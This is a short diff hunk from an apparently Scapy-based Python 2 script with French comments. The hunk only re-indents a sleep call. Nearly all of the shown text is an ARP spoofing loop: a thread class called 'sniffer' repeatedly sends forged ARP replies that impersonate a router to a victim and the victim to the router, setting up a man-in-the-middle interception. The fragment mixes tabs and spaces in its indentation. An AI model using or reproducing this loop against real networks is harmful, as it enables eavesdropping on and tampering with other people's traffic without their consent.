@@ -25,7 +25,7 @@ class sniffer(threading.Thread):
 		while 1:
 			send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=routerMAC))
 	    	send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=victimMAC))
-			time.sleep(1.5)
+	    	time.sleep(1.5)
 		print "Le thread sniff s'est bien termine"
     
 	#fonction permettant d'arreter la boucle du thread
